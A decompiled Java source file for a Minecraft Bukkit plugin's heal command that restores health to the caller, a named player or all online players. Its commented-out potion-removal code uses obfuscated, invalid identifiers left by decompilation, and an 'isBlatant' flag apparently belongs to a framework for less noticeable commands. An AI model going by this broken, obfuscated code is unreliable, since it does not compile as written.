/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.potion.PotionEffect
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
// import net.milkbowl.vault.ahW;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.potion.PotionEffect;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class HealCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.PREFIX("You have been healed"));
            p2.setHealth(20.0);
            for (PotionEffect effects : p2.getActivePotionEffects()) {
                // TODO: Fix
                //for (ahW.cNGkPvugEZGCwnFXzsFhZRUFKgCRWsQVdtvwLDJQ£.NprNW£vT bad : ahW.cNGkPvugEZGCwnFXzsFhZRUFKgCRWsQVdtvwLDJQ£.NprNW£vT.values()) {
                //    if (!effects.getType().getName().equalsIgnoreCase(bad.name())) continue;
                //    p2.removePotionEffect(effects.getType());
                //}
            }
        } else if (args[1].equals("*")) {
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                a2.sendMessage(Settings.PREFIX("You have been healed by " + Settings.RED + p2.getName()));
                a2.setHealth(20.0);
                for (PotionEffect effects : a2.getActivePotionEffects()) {
                    // TODO: Fix
                    /* for (ahW.cNGkPvugEZGCwnFXzsFhZRUFKgCRWsQVdtvwLDJQ£.NprNW£vT bad : ahW.cNGkPvugEZGCwnFXzsFhZRUFKgCRWsQVdtvwLDJQ£.NprNW£vT.values()) {
                        if (!effects.getType().getName().equalsIgnoreCase(bad.name())) continue;
                        a2.removePotionEffect(effects.getType());
                    } */
                }
            }
            p2.sendMessage(Settings.PREFIX("Everyone was healed!"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                target.sendMessage(Settings.PREFIX("You have been healed by " + Settings.RED + p2.getName()));
                target.setHealth(20.0);
                for (PotionEffect effects : target.getActivePotionEffects()) {
                    // TODO: Fix
                    /* for (ahW.cNGkPvugEZGCwnFXzsFhZRUFKgCRWsQVdtvwLDJQ£.NprNW£vT bad : ahW.cNGkPvugEZGCwnFXzsFhZRUFKgCRWsQVdtvwLDJQ£.NprNW£vT.values()) {
                        if (!effects.getType().getName().equalsIgnoreCase(bad.name())) continue;
                        target.removePotionEffect(effects.getType());
                    } */
                }
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }


}

